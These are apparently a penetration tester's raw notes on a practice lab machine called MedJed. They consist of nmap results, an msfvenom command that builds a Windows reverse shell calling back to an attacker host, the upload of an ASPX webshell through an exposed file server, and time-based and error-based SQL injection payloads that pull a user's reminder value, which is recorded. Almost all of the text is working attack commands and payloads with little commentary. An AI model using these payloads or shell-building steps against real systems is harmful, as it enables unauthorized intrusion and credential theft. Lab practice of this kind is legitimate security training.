# MedJed
# date 22/8/2023
# ip 192.168.165.127


# nmap
PORT     STATE SERVICE       REASON  VERSION
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
3306/tcp open  mysql?        syn-ack
8000/tcp open  http-alt      syn-ack BarracudaServer.com (Windows)


# ftp
└─$ ftp 192.168.165.127 30021
anonymous

# webpage 8000
administrator
administrator@gmail.com
set administrator account

http://192.168.165.127:8000/fs/C/Users/Jerren/Desktop/local.txt


# exploitation
└─$ msfvenom -p windows/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.199 LPORT=30021
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .
upload both file at http://192.168.165.127:8000/fs/C/Users/Jerren/Desktop/


christopher
http://192.168.165.127:33033/users/christopher
http://192.168.165.127:33033/test
http://192.168.165.127:33033/slug/



SELECT username FROM users WHERE username = '' UNION SELECT IF(1=1, SLEEP(5), null)-- -

http://192.168.165.127:33033/slug?URL=%27%20UNION%20SELECT%20IF(1=2,%20SLEEP(5),%20null)--%20-

SELECT username FROM users WHERE username = '' AND 1= (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)-- -


http://192.168.165.127:33033/slug?URL=%27%20AND%201=%20(SELECT%201%20FROM(SELECT%20COUNT(*),concat(0x3a,(SELECT%20username%20FROM%users%20LIMIT%200,1),FLOOR(rand(0)*2))x%20FROM%20information_schema.TABLES%20GROUP%20BY%20x)a)--%20-

http://192.168.165.127:33033/slug?URL=%27%20AND%201=%20(SELECT%201%20FROM(SELECT%20COUNT(*),concat(0x3a,(SELECT%20reminder%20FROM%20USERS%20LIMIT%200,1),FLOOR(rand(0)*2))x%20FROM%20information_schema.TABLES%20GROUP%20BY%20x)a)--%20-

:4qpdR87QYjRbog1



https://github.com/secjohn/ruby-shells/blob/master/shell.rb